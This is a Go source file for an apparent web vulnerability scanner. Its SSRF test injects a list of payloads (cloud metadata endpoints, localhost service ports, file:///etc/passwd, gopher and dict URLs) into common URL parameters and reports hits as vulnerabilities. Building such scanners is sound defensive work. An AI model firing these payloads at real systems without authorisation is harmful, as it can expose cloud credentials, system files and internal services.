package scanner

import (
    "fmt"
    "io"
    "net/url"
    "strings"
    
    "github.com/sin-engine/scanner-service/models"
)

func (e *ScanEngine) testSSRF() {
    params := []string{"url", "uri", "path", "dest", "redirect", "return", "load", "file", "document"}
    
    payloads := []string{
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://localhost",
        "http://127.0.0.1",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://localhost:8080",
        "dict://localhost:11211",
        "ftp://localhost:21",
    }
    
    urls := e.crawlTarget()
    
    for _, targetURL := range urls {
        parsed, err := url.Parse(targetURL)
        if err != nil {
            continue
        }
        
        query := parsed.Query()
        
        for _, param := range params {
            for _, payload := range payloads {
                testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, url.QueryEscape(payload))
                
                resp, err := e.client.Get(testURL)
                if err != nil {
                    continue
                }
                defer resp.Body.Close()
                
                body, _ := io.ReadAll(resp.Body)
                bodyStr := string(body)
                
                // Check for cloud metadata
                if strings.Contains(bodyStr, "instance-id") ||
                    strings.Contains(bodyStr, "ami-id") ||
                    strings.Contains(bodyStr, "public-keys") ||
                    strings.Contains(bodyStr, "security-credentials") {
                    
                    vuln := models.NewVulnerability()
                    vuln.Type = "Server-Side Request Forgery (SSRF)"
                    vuln.Severity = models.SeverityCritical
                    vuln.Name = "SSRF to Cloud Metadata"
                    vuln.URL = targetURL
                    vuln.Parameter = param
                    vuln.Payload = payload
                    vuln.Evidence = "Cloud metadata endpoint accessible"
                    vuln.Description = "The application can be tricked into making requests to internal cloud metadata endpoints, potentially exposing sensitive information."
                    vuln.Remediation = "Implement URL whitelisting and validate all external requests. Disable access to internal networks."
                    vuln.CWE = "CWE-918"
                    vuln.CVSS = 9.0
                    
                    select {
                    case e.vulnChan <- vuln:
                    default:
                    }
                    
                    break
                }
                
                // Check for local file access
                if strings.Contains(bodyStr, "root:x:") ||
                    strings.Contains(bodyStr, "[fonts]") ||
                    strings.Contains(bodyStr, "Administrator") {
                    
                    vuln := models.NewVulnerability()
                    vuln.Type = "Server-Side Request Forgery (SSRF)"
                    vuln.Severity = models.SeverityHigh
                    vuln.Name = "SSRF with File Access"
                    vuln.URL = targetURL
                    vuln.Parameter = param
                    vuln.Payload = payload
                    vuln.Evidence = "Local file accessible via SSRF"
                    vuln.Description = "The application can be tricked into reading local files via SSRF."
                    vuln.Remediation = "Implement URL whitelisting and validate all external requests."
                    vuln.CWE = "CWE-918"
                    vuln.CVSS = 7.5
                    
                    select {
                    case e.vulnChan <- vuln:
                    default:
                    }
                    
                    break
                }
            }
        }
    }
}